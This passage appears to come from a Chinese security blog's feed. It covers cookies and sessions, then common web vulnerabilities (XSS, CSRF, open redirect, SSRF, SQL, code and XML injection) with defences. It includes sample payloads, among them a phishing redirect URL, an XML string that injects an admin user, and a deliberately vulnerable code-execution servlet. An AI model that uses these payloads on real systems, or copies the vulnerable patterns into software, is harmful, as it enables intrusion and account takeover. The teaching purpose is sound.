id="原因大致有以下两点："><a href="#原因大致有以下两点：" class="headerlink" title="原因大致有以下两点："></a><strong>原因大致有以下两点：</strong></h4><h5 id="1-开发的方便性和系统的安全性"><a href="#1-开发的方便性和系统的安全性" class="headerlink" title="(1)开发的方便性和系统的安全性"></a><strong>(1)开发的方便性和系统的安全性</strong></h5><p>在实际开发的时候，session的实现和应用已经很成熟。可以将其做分布式的储存和共享，它的加密算法也无需再去进行更改或者什么的,这样就不需要每个开发者自己思考用什么算法，这样会导致很不统一，并且也增加了开发人员的负担，同时这也避免了开发者自己去设计一些乱七八糟的算法，不合理的设计和使用反而会降低系统的安全性。</p><h5 id="2-数据包的大小"><a href="#2-数据包的大小" class="headerlink" title="(2)数据包的大小"></a><strong>(2)数据包的大小</strong></h5><p>我们知道用户的信息还是比较多的，如果我们使用加密算法在本地进行加密传输的话，加密后数据会膨胀的很大，这样就会增加数据包的大小，这是很不好的。</p><p>综上，使用 session 在安全性和实用性上要比单纯使用 cookie 保存用户信息更优越 </p><h2 id="0X02-常见问题"><a href="#0X02-常见问题" class="headerlink" title="0X02 常见问题"></a><strong>0X02 常见问题</strong></h2><p>我在网站寻找类似的文章的时候看到一些结论，有些是比较片面的，或者说只是其中的一种情况而已，下面来纠正一下。</p><h3 id="问题一：cookie-session-id-在浏览器关闭后就失效了"><a href="#问题一：cookie-session-id-在浏览器关闭后就失效了" class="headerlink" title="问题一：cookie&#x2F;session_id 在浏览器关闭后就失效了"></a><strong>问题一：cookie&#x2F;session_id 在浏览器关闭后就失效了</strong></h3><p>首先这句话肯定是错的，因为这需要一个前提条件，<strong>条件就是：默认情况下</strong>，我们知道 cookie 在设置的时候是可以设置生存时间的，就像下面这个样子</p><pre><code class="hljs">setcookie(&#39;sessid&#39;, &#39;uniqid&#39;, time()+3600, &#39;/&#39;, &#39;&#39;, true, true);</code></pre><p>我们可以将其设置为很长一段时间，那么这样的话，cookie 或者说 session_id 就会被浏览器保存在硬盘里长期有效。</p><blockquote><p><strong>补充：</strong></p><p>session 的默认生存时间是 20 分钟，也就是说你不另外设置的话 session_id 20分钟后就失效了</p></blockquote><h3 id="问题二：cookie分为二种，以文件方式存在硬盘空间上的长期性的cookie和停留在浏览器所占内存中的临时性的cookie"><a href="#问题二：cookie分为二种，以文件方式存在硬盘空间上的长期性的cookie和停留在浏览器所占内存中的临时性的cookie" class="headerlink" title="问题二：cookie分为二种，以文件方式存在硬盘空间上的长期性的cookie和停留在浏览器所占内存中的临时性的cookie"></a><strong>问题二：cookie分为二种，以文件方式存在硬盘空间上的长期性的cookie和停留在浏览器所占内存中的临时性的cookie</strong></h3><p>这句话其实还是片面的，只能说从时间上划分可以这样将 cookie 分成两类，但是他后面这么说(我这里就直接截图了)：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%86%8D%E8%B0%88Cookie1.png" alt="此处输入图片的描述"></p><p>我是在是不懂这是在说啥，巨大的误导……他似乎把 cookie 和 session_id 完全分开了，其实cookie 中真正保存用户信息的就是 session_id</p><p>我们选择记住自己的登录状态其实就是设置比较长的 cookie 或者说 session_id 的生存时间，然后让其保存在客户端的硬盘上。</p><h2 id="0X03-参考链接"><a href="#0X03-参考链接" class="headerlink" title="0X03 参考链接"></a><strong>0X03 参考链接</strong></h2><p><a href="http://www.cnblogs.com/demingblog/p/3878185.html">http://www.cnblogs.com/demingblog/p/3878185.html</a></p><h2 id="0X04-总结"><a href="#0X04-总结" class="headerlink" title="0X04 总结"></a><strong>0X04 总结</strong></h2><p>这篇文章其实是我一直以来都想写的，但是由于时间关系以及自己的理解还不是特别的到位，不知道该怎么表达，今天因为又遇到了这个问题，我就又借此机会好好的思考了一下，也请教了我的一些专业的开发的学长，写下这篇文章，也是希望让更多的和我曾经一样对此困惑的人有一个参考，当然我依然不能保证我说的完全正确，我希望更多专业的人能帮助我发现这篇文章中的问题并联系我加以纠正，以免误导更多的人。</p>]]></content>
    
    
    <categories>
      
      <category>学习思考</category>
      
    </categories>
    
    
    <tags>
      
      <tag>备忘</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>基础 Web 漏洞攻击与防御的思考</title>
    <link href="/2019/02/03/%E5%9F%BA%E7%A1%80%20Web%20%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1%E7%9A%84%E6%80%9D%E8%80%83/"/>
    <url>/2019/02/03/%E5%9F%BA%E7%A1%80%20Web%20%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1%E7%9A%84%E6%80%9D%E8%80%83/</url>
    
    <content type="html"><![CDATA[<h2 id="0X00-前言"><a href="#0X00-前言" class="headerlink" title="0X00 前言"></a><strong>0X00 前言</strong></h2><p>未知攻焉知防，攻与防的较量每天都在上演，但这些攻击都逃不过这几大基本的漏洞类型，下面我简单的列举的了几个漏洞类型，并对其中比较重要的漏洞的产生原因、攻击方法、防御措施做了一个简单的分析，并加入了一些自己的思考。</p><h2 id="0X01-页面展示类漏洞"><a href="#0X01-页面展示类漏洞" class="headerlink" title="0X01 页面展示类漏洞"></a><strong>0X01 页面展示类漏洞</strong></h2><h3 id="一、XSS"><a href="#一、XSS" class="headerlink" title="一、XSS"></a><strong>一、XSS</strong></h3><h4 id="1-XSS-的类型"><a href="#1-XSS-的类型" class="headerlink" title="1.XSS 的类型"></a><strong>1.XSS 的类型</strong></h4><h5 id="1-反射型"><a href="#1-反射型" class="headerlink" title="(1)反射型"></a><strong>(1)反射型</strong></h5><p>攻击者会通过社会工程学手段，发送一个URL连接给用户打开，在用户打开页面的同时，浏览器会执行页面中嵌入的恶意脚本。</p><h5 id="2-存储型"><a href="#2-存储型" class="headerlink" title="(2)存储型"></a><strong>(2)存储型</strong></h5><span id="more"></span><p>攻击者利用web应用程序提供的录入或修改数据功能，将数据存储到服务器或用户cookie中，当其他用户浏览展示该数据的页面时，浏览器会执行页面中嵌入的恶意脚本。所有浏览者都会受到攻击。</p><h5 id="3-DOM型"><a href="#3-DOM型" class="headerlink" title="(3)DOM型"></a><strong>(3)DOM型</strong></h5><p>由于html页面中，定义了一段JS，JS 代码会根据用户的输入，动态显示一段html代码，攻击者可以在输入时，插入一段恶意脚本，最终展示时，会执行恶意脚本。</p><blockquote><p>DOM跨站和以上两个跨站攻击的差别是，DOM跨站是纯页面脚本的输出，只有规范使用JAVASCRIPT，才可以防御</p></blockquote><h4 id="2-XSS-的本质"><a href="#2-XSS-的本质" class="headerlink" title="2.XSS 的本质"></a><strong>2.XSS 的本质</strong></h4><p>本质就是<strong>执行 JS 脚本</strong>，所以 js 能做什么XSS 就能做什么，最主要的还是一种交互，向外界发送数据或者从外界获取数据，再或者就是直接完成一些动作，如跳转、模拟点击等。</p><p>(1)发送数据体现在向外发送cookie 或者 CSRF token 等，来帮助攻击者获取令牌伪造身份<br>(2)从外界获取数据体现在利用 XSS 进行钓鱼，比如在该页面上面引入外部页面，覆盖原有页面掩人耳目<br>(3)完成动作体现在，URL 重定向攻击，带受害者去另一个恶意页面，进行钓鱼以及模拟用户发送请求(CSRF)，如自我复制的 <a href="http://netsecurity.51cto.com/art/201609/516740.htm">XSS 蠕虫</a></p><h4 id="3-XSS-的产生原因"><a href="#3-XSS-的产生原因" class="headerlink" title="3.XSS 的产生原因"></a><strong>3.XSS 的产生原因</strong></h4><p>对用户数据过滤不严而将恶意的 JS 代码直接输入了 html 标签，当页面加载时便会执行。</p><h4 id="4-解决方案"><a href="#4-解决方案" class="headerlink" title="4.解决方案"></a><strong>4.解决方案</strong></h4><p>1.在HTML&#x2F;XML中显示“用户可控数据”前，应该进行html escape转义。<br>2.在javascript内容中输出的“用户可控数据”，需要做javascript escape转义。<br>3.对输出到富文本中的“用户可控数据”，做富文本安全过滤（允许用户输出HTML的情况）。<br>4.一些html标签的属性，需要，如果接收“用户可控数据”，需要做安全检查。<br>5.DOM XSS 请规范使用 javascript，遵守 javascript 安全编码规范<br>6.在给用户设置认证COOKIE时，加入HTTPONLY<br>7.在style内容中输出的“用户可控数据”，需要做CSS escape转义<br>8.ajax 中的 xml json 中的用户可控数据 做 escape 转义</p><h3 id="二、Third-party-script-references"><a href="#二、Third-party-script-references" class="headerlink" title="二、Third-party script references"></a><strong>二、Third-party script references</strong></h3><h4 id="1-Third-party-script-references的原理及危害"><a href="#1-Third-party-script-references的原理及危害" class="headerlink" title="1.Third-party script references的原理及危害"></a><strong>1.Third-party script references的原理及危害</strong></h4><p>Third-party script references，引用第三方网站脚本或iframe指向第三方网站。</p><p>当html页面引用了第三方网站的脚本，或者有iframe指向第三方网站时，一旦这个第三方网站出现安全问题，被黑客控制写入恶意脚本，那么该页面或脚本也会展示在自己网站上，会导致自己网站的安全性大大降低，访问者间接受到影响。</p><h4 id="2-攻击示例"><a href="#2-攻击示例" class="headerlink" title="2.攻击示例"></a><strong>2.攻击示例</strong></h4><p>当自己网站上有这样一段代码的时候</p><pre><code class="hljs">&lt;script src=&quot;http://www.another.com/some.js&quot;&gt;&lt;/script&gt;</code></pre><p>这段代码会执行<a href="http://www.another.com网站下的some.js脚本./">www.another.com网站下的some.js脚本。</a></p><p>或者自己网站上有着这样一段代码</p><p>下面是一段引用第三方网站iframe的代码：</p><pre><code class="hljs">&lt;iframe src=&quot;http://www.another.com/some.html&quot;&gt;&lt;/iframe&gt;</code></pre><p>这段代码会同时打开 <a href="http://www.another.com/some.html">http://www.another.com/some.html</a> 这个页面。</p><p>恶意用户可以做以下攻击：恶意用户会先入侵 <a href="http://www.some.com/">www.some.com</a> 这个网站，之后将恶意代码加入 <a href="http://www.another.com/some.js">http://www.another.com/some.js</a> ,当这个文件有恶意代码时，也会被展示在自己的web页面上。</p><h4 id="3-解决方案"><a href="#3-解决方案" class="headerlink" title="3.解决方案"></a><strong>3.解决方案</strong></h4><p>正确使用 CSP 来禁用外部脚本，或者用 CSP 设置脚本来源白名单</p><h2 id="0X02-伪装欺骗类漏洞"><a href="#0X02-伪装欺骗类漏洞" class="headerlink" title="0X02 伪装欺骗类漏洞"></a><strong>0X02 伪装欺骗类漏洞</strong></h2><h3 id="一、CSRF"><a href="#一、CSRF" class="headerlink" title="一、CSRF"></a><strong>一、CSRF</strong></h3><h4 id="1-CSRF-的原理"><a href="#1-CSRF-的原理" class="headerlink" title="1.CSRF 的原理"></a><strong>1.CSRF 的原理</strong></h4><p>Cross-Site Request Forgery（CSRF），跨站请求伪造攻击。<br>攻击者在用户浏览网页时，利用页面元素（例如img的src），强迫受害者的浏览器向Web应用程序发送一个改变用户信息的请求。由于发生CSRF攻击后，攻击者是强迫用户向服务器发送请求，所以会造成用户信息被迫修改，更严重者引发蠕虫攻击。</p><h4 id="2-CSRF-的攻击方式及危害"><a href="#2-CSRF-的攻击方式及危害" class="headerlink" title="2.CSRF 的攻击方式及危害"></a><strong>2.CSRF 的攻击方式及危害</strong></h4><p><strong>CSRF攻击可以从站外和站内发起</strong>。</p><p><strong>(1)从站内发起CSRF攻击:<strong>需要利用网站</strong>本身的业务</strong>，比如“自定义头像”功能，恶意用户指定自己的头像URL是一个修改用户信息的链接，当其他已登录用户浏览恶意用户头像时，会自动向这个链接发送修改信息请求。</p><p>**(2)从站外发起CSRF攻击:**则需要恶意用户在自己的服务器上，放一个自动提交修改个人信息的html页面，并把页面地址发给受害者用户，受害者用户打开时，会发起一个请求。如果恶意用户能够知道网站管理后台某项功能的URL，就可以直接攻击管理员，强迫管理员执行恶意用户定义的操作。</p><h4 id="3-CSRF-的本质"><a href="#3-CSRF-的本质" class="headerlink" title="3.CSRF 的本质"></a><strong>3.CSRF 的本质</strong></h4><p>本质就是<strong>利用 JS 脚本</strong>以及攻击者精心构造的恶意请求，结合用户的某网站 SESSION 已经存在的条件，在用户不知不觉中向该网站发起篡改请求。</p><p>再结合我们之前说的 <strong>XSS 的攻击方式的本质</strong>，我们也不难发现两者之间的紧密联系，这也是两者经常配合利用的原因，两者的结合也是钓鱼人经常利用的手法。</p><p>**(1)网站内部脚本:**因为当网站出现 XSS 漏洞的时候，就意味着能插入 JS 脚本，那就能在用户不知情的情况下向本站发起请求，这种请求是模仿来源于本站用户的请求的，如果用户是管理员且登录后台，攻击者在知道后台表单格式的情况下，就可以构造针对性的请求使之被莫名篡改，达成攻击目的。</p><p>**(2)网站外部脚本：**如果网站出现 XSS ，那么就可以引入一个外部页面，这个页面可以是任意页面，用户看起来就是到了另一个页面(注意此时地址栏的 URL 是不变的，当然用户不会注意到)，我们可以在这个页面里面引入一个 iframe,iframe 引入我们的恶意请求(当然我们要设置 iframe 宽高为 0)，这样也同样达到了隐形篡改的目的。</p><h4 id="4-解决方案-1"><a href="#4-解决方案-1" class="headerlink" title="4.解决方案"></a><strong>4.解决方案</strong></h4><h5 id="1-Token-防御"><a href="#1-Token-防御" class="headerlink" title="(1)Token 防御"></a><strong>(1)Token 防御</strong></h5><p><strong>遵循以下三步可预防 CSRF：</strong></p><p>1.在用户登陆时，设置一个CSRF的随机TOKEN，存放在用户的<strong>设置了 http-only 的cookie中</strong>，或者是 session 中，当用户浏览器关闭、或用户再次登录、或退出时，清除token。<br>2.在表单中，生成一个隐藏域，它的值就是COOKIE中随机TOKEN。<br>3.表单被提交后，就可以在接收用户请求的web应用中，判断表单中的TOKEN值是否和用户 http-only 的COOKIE中的或者是服务器端的 sesson 中的TOKEN值一致，如果不一致或没有这个值，就判断为CSRF攻击，同时记录攻击日志</p><p><strong>由于攻击者无法预测每一个用户登录时生成的那个随机TOKEN值，所以无法伪造这个参数。</strong></p><h5 id="2-同源策略"><a href="#2-同源策略" class="headerlink" title="(2)同源策略"></a><strong>(2)同源策略</strong></h5><p>对于 ajax 形式的 csrf ,同源策略是一概拒绝的</p><h5 id="3-验证-referer"><a href="#3-验证-referer" class="headerlink" title="(3)验证 referer :"></a><strong>(3)验证 referer :</strong></h5><p>(1)但是由于 referer 是浏览器设置的，属于第三方，这样就把安全寄托于第三方之上，某种程度来说也是不是很安全，虽然已经安全做的很好了<br>(2)由于用户可以自己设置不生成 referer ，因此在这种情况下不是很好用<br>(3) referer 只能用来防御外部脚本的 CSRF ，但是对于网站本身由 XSS 造成的 CSRF 是无法防御的。</p><blockquote><p><strong>注意：</strong></p><p>1.放在 http-only 的 cookie 里面是为了，防止出现 正规网站的 xss 获取 cookie 中的 token 后在发送 请求<br>2.XSS 漏洞高于 SCRF 如果出现了 xss 的话，很有可能回绕过 CSRF 防护进行攻击<br>3.当出现GET请求修改用户数据时，一旦在url中出现了csrftoken，当前页面就不允许出现用户定义的站外链接，否则攻击者可以引诱用户点击攻击者定义的链接，访问在自己的网站，从referer中，获取url中的csrftoken，造成csrftoken泄露。</p></blockquote><h3 id="二、URL-Redirect"><a href="#二、URL-Redirect" class="headerlink" title="二、URL Redirect"></a><strong>二、URL Redirect</strong></h3><h4 id="1-URL-Redirect-的原理"><a href="#1-URL-Redirect-的原理" class="headerlink" title="1.URL Redirect 的原理"></a><strong>1.URL Redirect 的原理</strong></h4><p>Web应用程序接收到用户提交的URL参数后，没有对参数做“可信任URL”的验证，就向用户浏览器返回跳转到该URL的指令。</p><h4 id="2-URL-Redirect攻击方式及危害"><a href="#2-URL-Redirect攻击方式及危害" class="headerlink" title="2.URL Redirect攻击方式及危害"></a><strong>2.URL Redirect攻击方式及危害</strong></h4><p>如果 xxxx.com 这个可信网站下的某个web应用程序存在这个漏洞，恶意攻击者可以发送给用户一个看上去是指向 xxxx.com网站的链接，但是用户打开后，实际上早就不在 xxxx.com 网站下了，而是跳转到了攻击者精心设计的钓鱼网站页面，而此时受害者还以为自己在 xxxx.com 网站下，这就导致用户被钓鱼攻击，账号被盗，或账号相关财产被盗。</p><p><strong>例如这样一段代码</strong></p><pre><code class="hljs">if(checklogin(request))&#123;response.sendRedirect(request.getParameter(&quot;url&quot;));&#125;</code></pre><p>这段代码并没有检验 url 的跳转地址就直接跳转了，导致了该漏洞的发生，同样，这也是钓鱼人最喜欢的攻击方式</p><h4 id="3-攻击举例"><a href="#3-攻击举例" class="headerlink" title="3.攻击举例"></a><strong>3.攻击举例</strong></h4><p>攻击者某天盗了某管理员同事的QQ号，然后给这个管理员发了一个链接，链接如下：</p><pre><code class="hljs">http://admin.xxxx.com/member/sigin.htm?done=http://www.hacker.com:8080/admin/sigin.htm</code></pre><p>因为这个链接很长，管理员可能就看了一下开头，感觉是自己管理界面的 URL ，然后以为有什么事，就点开了，但是没想到这里存在一个 URL Redirect 漏洞，实际访问的是 <a href="http://www.hacker.com:8080/admin/sigin.htm">http://www.hacker.com:8080/admin/sigin.htm</a> 这是一个攻击者精心构造的，和管理后台界面一样的页面，然后要求管理员输入密码，这时候其实输入任何密码都会说错误，然后就会跳转到真正的登录界面，此时管理员并没有发觉，再次输入密码，成功进入后台，但此时攻击者早就掌握了管理员的账号密码了。</p><h4 id="4-解决方案-2"><a href="#4-解决方案-2" class="headerlink" title="4.解决方案"></a><strong>4.解决方案</strong></h4><h5 id="1-设置并验证-token"><a href="#1-设置并验证-token" class="headerlink" title="1.设置并验证 token"></a><strong>1.设置并验证 token</strong></h5><p>为了保证用户所点击的URL，是从web应用程序中生成的URL，所以要做TOKEN验证。</p><p>(1)当用户访问需要生成跳转URL的页面时，首先生成随机token，并放入cookie。<br>(2)在显示连接的页面上生成URL，在URL参数中加入token。</p><p><strong>示例：</strong></p><pre><code class="hljs">http://admin.xxxx.com/member/sigin.htm?done=http://www.xxxx.com&amp;token=5743892783432432</code></pre><p>(3)应用程序在跳转前，判断token是否和cookie中的token一致，如果不一致，就判定为URL跳转攻击，并记录日志.<br>(4)如果在javascript中做页面跳转，需要判断域名白名单后，才能跳转。</p><h5 id="2-设置地址白名单"><a href="#2-设置地址白名单" class="headerlink" title="2.设置地址白名单"></a><strong>2.设置地址白名单</strong></h5><p>(1)如果应用只有跳转到本集团&#x2F;公司网站的需求，可以设置白名单，判断目的地址是否在白名单列表中，如果不在列表中，就判定为URL跳转攻击，并记录日志</p><p>(2)不允许配置集团以外网站到白名单列表中。</p><p>这两个方案都可以保证所有在应用中发出的重定向地址，都是可信任的地址。</p><h3 id="三、SSRF"><a href="#三、SSRF" class="headerlink" title="三、SSRF"></a><strong>三、SSRF</strong></h3><h4 id="1-SSRF的原理及危害"><a href="#1-SSRF的原理及危害" class="headerlink" title="1.SSRF的原理及危害"></a><strong>1.SSRF的原理及危害</strong></h4><p>很多web应用都提供了从其他的服务器上获取数据的功能。使用用户指定的URL，web应用可以获取图片，下载文件，读取文件内容等。这个功能如果被恶意使用，可以利用存在缺陷的web应用作为代理攻击远程和本地的服务器。这种形式的攻击称为服务端请求伪造攻击（Server-side Request Forgery）。</p><p>一般情况下， SSRF攻击的目标是从外网无法访问的内部系统（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统 ）<br>SSRF 形成的原因大都是由于 服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制 比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。</p><p><strong>攻击者利用ssrf可以实现的攻击主要有5种:</strong></p><p>1.可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息;<br>2.攻击运行在内网或本地的应用程序（比如溢出）;<br>3.对内网web应用进行指纹识别，通过访问默认文件实现;<br>4.攻击内外网的web应用，主要是使用get参数就可以实现的攻击（比如struts2，sqli等）;<br>5.利用file协议读取本地文件等。<br>6.还可以使用 gopher 协议拓宽我们的攻击面，比如实现攻击内网的 mysql </p><h4 id="2-攻击方式"><a href="#2-攻击方式" class="headerlink" title="2.攻击方式"></a><strong>2.攻击方式</strong></h4><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%9F%BA%E7%A1%80Web%E6%BC%8F%E6%B4%9E1.png" alt="此处输入图片的描述"></p><h4 id="3-解决方案-1"><a href="#3-解决方案-1" class="headerlink" title="3.解决方案"></a><strong>3.解决方案</strong></h4><p>解决方案无非就两种思路，一种是打断从内网出外网的道路，另一种就是打断边界服务器进内网的道路，当然实际中这两者需要结合使用</p><p><strong>打断由内到外：</strong></p><p>1.过滤内网服务器对公网服务器请求的响应。如果Web应用是获取某一类型的文件，在把返回结果展示给用户之前应先验证返回的信息是否符合文件类型标准，比如返回信息应为图片，如果返回信息是HTML，则停止将返回信息返回客户端。<br>2.统一错误提示信息，避免用户可以根据错误信息来判断远端服务器的端口状态。</p><p><strong>打断由外到内：</strong></p><p>1.在内网服务器的防火墙上限制公网服务器的请求端口为HTTP等协议常用端口，如：80、443、8080、8090。<br>2.若公网服务器的内网IP与内网无业务通信，建议将公网服务器对应的内网IP列入黑名单，避免应用被用来获取内网数据。<br>3.内网服务器禁用不必要的协议，仅允许HTTP和HTTPS请求，防止类似于file:&#x2F;&#x2F;&#x2F;、gopher:&#x2F;&#x2F;、ftp:&#x2F;&#x2F; 等协议引起的安全问题。</p><h2 id="0X03-注入类漏洞"><a href="#0X03-注入类漏洞" class="headerlink" title="0X03 注入类漏洞"></a><strong>0X03 注入类漏洞</strong></h2><h3 id="一、SQLi"><a href="#一、SQLi" class="headerlink" title="一、SQLi"></a><strong>一、SQLi</strong></h3><h4 id="1-SQLi-的原理"><a href="#1-SQLi-的原理" class="headerlink" title="1.SQLi 的原理"></a><strong>1.SQLi 的原理</strong></h4><p>当应用程序将用户输入的内容，<strong>拼接</strong>到SQL语句中，一起提交给数据库执行时，就会产生SQL注入威胁。</p><h4 id="2-SQLi-的攻击方式以及危害"><a href="#2-SQLi-的攻击方式以及危害" class="headerlink" title="2.SQLi 的攻击方式以及危害"></a><strong>2.SQLi 的攻击方式以及危害</strong></h4><p>由于用户的输入，也是SQL语句的一部分，所以攻击者可以利用这部分可以控制的内容，注入自己定义的语句，改变SQL语句执行逻辑，让数据库执行任意自己需要的指令。通过控制部分SQL语句，攻击者可以查询数据库中任何自己需要的数据，利用数据库的一些特性，可以直接获取数据库服务器的系统权限。</p><h4 id="3-解决方案-2"><a href="#3-解决方案-2" class="headerlink" title="3.解决方案"></a><strong>3.解决方案</strong></h4><p>使用预处理的方式去执行SQL语句，对所有传入SQL语句中的变量，做绑定。这样，用户拼接进来的变量，无论内容是什么，都会被当做替代符号“?”所替代的值，数据库也不会把恶意用户拼接进来的数据，当做部分SQL语句去解析，从而保证了数据库的安全性。</p><p><strong>Java odbc示例：</strong></p><pre><code class="hljs">com.mysql.jdbc.Connection conn = db.JdbcConnection.getConn();final String sql = &quot;select * from product where pname like ?&quot;;java.sql.PreparedStatement ps = (java.sql.PreparedStatement) conn.prepareStatement(sql);ps.setObject(1, &quot;%&quot;+request.getParameter(&quot;pname&quot;)+&quot;%&quot;);ResultSet rs = ps.executeQuery();</code></pre><p><strong>PHP示例：</strong></p><pre><code class="hljs">$query = &quot;INSERT INTO myCity (Name, CountryCode, District) VALUES (?,?,?)&quot;;$stmt = $mysqli-&gt;prepare($query);$stmt-&gt;bind_param(&quot;sss&quot;, $val1, $val2, $val3);$val1 = &#39;Stuttgart&#39;;$val2 = &#39;DEU&#39;;$val3 = &#39;Baden-Wuerttemberg&#39;;/* Execute the statement */$stmt-&gt;execute();</code></pre><p>当然和对于 PHP 而言现在有一种方法叫做 PDO，和 mysqli 原理类似，但是支持更多的数据库类型，不像 mysqli 只支持 MySQL 一种，当然 mysqli 这种针对性的扩展相对于 MySQL 数据库而言效果更好。两者更详细的比较可以参考<a href="https://www.cnblogs.com/feng18/p/6523646.html">这篇文章</a> </p><h4 id="4-常见问题"><a href="#4-常见问题" class="headerlink" title="4.常见问题"></a><strong>4.常见问题</strong></h4><p><strong>用了 PDO 这种预编译就能完全预防 SQL 注入了吗？</strong> </p><p>(1) PDO 并不能满足全部的 SQL 语句，有些语句过于复杂，使用 PDO 就非常困难，<br>(2)我们说安全最薄弱环节的还是人，有一些老的系统是从原来的语句改成使用预编译的，这种情况下就很可能有漏网之鱼<br>(3)p 牛写过<a href="https://www.leavesongs.com/PENETRATION/thinkphp5-in-sqlinjection.html">一篇文章</a>，关于 TP5 的一处注入，在 PDO::ATTR_EMULATE_PREPARES &#x3D;&gt; false（模拟预编译为 flase）的情况下如果能控制PDO 执行三部曲</p><pre><code class="hljs">prepare($SQL) 编译SQL语句bindValue($param, $value) 将value绑定到param的位置上execute() 执行</code></pre><p>中的第一步，就能让其在服务器端编译的时候报错，而不像控制第二部报错了不能执行到第三部</p><p>(4)PHP 5.3.6及以前版本的PDO的bindParam,bindValue潜在的安全隐患，PHP 5.3.6及老版本，并不支持在DSN中定义charset属性（会忽略之），这时如果使用PDO的本地转义，仍然可能导致SQL注入，这个点的来源是<a href="https://zhangxugg-163-com.iteye.com/blog/1855088">这篇文章</a></p><h3 id="二、Code-injection"><a href="#二、Code-injection" class="headerlink" title="二、Code injection"></a><strong>二、Code injection</strong></h3><h4 id="1-Code-injection-原理及危害"><a href="#1-Code-injection-原理及危害" class="headerlink" title="1.Code injection 原理及危害"></a><strong>1.Code injection 原理及危害</strong></h4><p>在 web 应用运行的过程中，用户输入的参数直接或者间接地作为代码的一部分传入到可以执行代码的函数 如：php 中的 eval()当中，在没有过滤或者过滤的不完全的情况下，攻击者可以控制这个输入实现任意代码在服务器端执行，从而实现各种攻击目的。</p><p>恶意用户可以写一个远程控制木马，直接获取服务器控制权限，所有服务器上的资源都会被恶意用户获取和修改，甚至可以直接控制数据库。</p><h4 id="2-攻击示例-1"><a href="#2-攻击示例-1" class="headerlink" title="2.攻击示例"></a><strong>2.攻击示例</strong></h4><p><strong>servlet 代码：</strong></p><pre><code class="hljs">public void doGet(HttpServletRequest request, HttpServletResponse response)throws ServletException, IOException &#123;    response.setContentType(&quot;text/html&quot;);    PrintWriter out = response.getWriter();    try &#123;        File file = File.createTempFile(&quot;JavaRuntime&quot;, &quot;.java&quot;, new File(System.getProperty(&quot;user.dir&quot;)));        String filename = file.getName();        String classname = filename.substring(0, filename.length() - 5);        String[] args = new String[] &#123;             &quot;-d&quot;,            System.getProperty(&quot;user.dir&quot;),             filename         &#125;;        PrintWriter outfile = new PrintWriter(new FileOutputStream(file));        outfile.write(&quot;public class &quot; + classname + &quot;&#123;public void myfun(String args)&quot;         + &quot;&#123;try &#123;&quot;+ request.getParameter(&quot;code&quot;)+ &quot;&#125; catch (Exception e) &#123;&#125;&#125;&#125;&quot;);        outfile.flush();        outfile.close();        (new Main()).compile(args, outfile);        URL url = new URL(&quot;file://&quot;+ file.getPath().substring(0,file.getPath().lastIndexOf(&quot;\\&quot;) + 1));        java.net.URLClassLoader myloader = new URLClassLoader(new URL[] &#123; url &#125;, Thread.currentThread().getContextClassLoader());        Class cls = myloader.loadClass(classname);        cls.getMethod(&quot;myfun&quot;, new Class[] &#123; String.class &#125;).invoke(cls.newInstance(), new Object[] &#123; &quot;&quot; &#125;);&#125; catch (Exception se) &#123;    se.printStackTrace();&#125;out.println();out.flush();out.close();</code></pre><p>}</p><p>这个代码中 request.getParameter(“code”) 中的 code 用户可控，且没有有效的过滤，我们就可以构造下面的语句进行攻击</p><p><strong>Payload:</strong></p><pre><code class="hljs">http://www.xxxx.com/servlet/Active?code=System.out.println(&quot;kxlzx&quot;);</code></pre><h4 id="3-解决方案-3"><a href="#3-解决方案-3" class="headerlink" title="3.解决方案"></a><strong>3.解决方案</strong></h4><p>对于应用代码中的可以执行代码的函数的输入全部来源于开发人员的编写，来确保用户不可控，对于一定要用户确定代码的情况，用户能做的只是根据开发人员提供的接口选择对应的代码执行。</p><h3 id="三、XML-injection-普通"><a href="#三、XML-injection-普通" class="headerlink" title="三、XML injection(普通)"></a><strong>三、XML injection(普通)</strong></h3><h4 id="1-XML-injection-普通-原理及危害"><a href="#1-XML-injection-普通-原理及危害" class="headerlink" title="1.XML injection(普通) 原理及危害"></a><strong>1.XML injection(普通) 原理及危害</strong></h4><p>XML是存储数据的地方，如果在查询或修改时，如果没有做转义，直接输入或输出数据，都将导致XML注入漏洞。攻击者可以修改XML数据格式，增加新的XML节点，对数据处理流程产生影响。</p><h4 id="2-攻击示例-2"><a href="#2-攻击示例-2" class="headerlink" title="2.攻击示例"></a><strong>2.攻击示例</strong></h4><p><strong>这里是一个保存注册用户信息为xml的例子：</strong></p><pre><code class="hljs">final String GUESTROLE = &quot;guest_role&quot;;...//userdata是准备保存的xml数据，接收了name和email两个用户提交来的数据。String userdata = &quot;&lt;USER role=&quot;+ GUESTROLE+  &quot;&gt;&lt;name&gt;&quot;+ request.getParameter(&quot;name&quot;)+ &quot;&lt;/name&gt;&lt;email&gt;&quot;+ request.getParameter(&quot;email&quot;)+&quot;&lt;/email&gt;&lt;/USER&gt;&quot;;//保存xmluserDao.save(userdata);</code></pre><p>对用户的输入没有做任何的过滤，原本注册用户后，应该产生一条这样的用户记录：</p><pre><code class="hljs">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;USER role=&quot;guest_role&quot;&gt;    &lt;name&gt;user1&lt;/name&gt;    &lt;email&gt;user1@a.com&lt;/email&gt;&lt;/USER&gt;</code></pre><p>但是恶意用户的输入却是下面这个样子</p><pre><code class="hljs">user1@a.com&lt;/email&gt;&lt;/USER&gt;&lt;USER role=&quot;admin_role&quot;&gt;&lt;name&gt;kxlzx&lt;/name&gt;&lt;email&gt;user2@a.com</code></pre><p>于是最后注册以后就变成了下面这个样子</p><pre><code class="hljs">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;USER role=&quot;guest_role&quot;&gt;    &lt;name&gt;user1&lt;/name&gt;    &lt;email&gt;user1@a.com&lt;/email&gt;&lt;/USER&gt;&lt;USER role=&quot;admin_role&quot;&gt;    &lt;name&gt;kxlzx&lt;/name&gt;    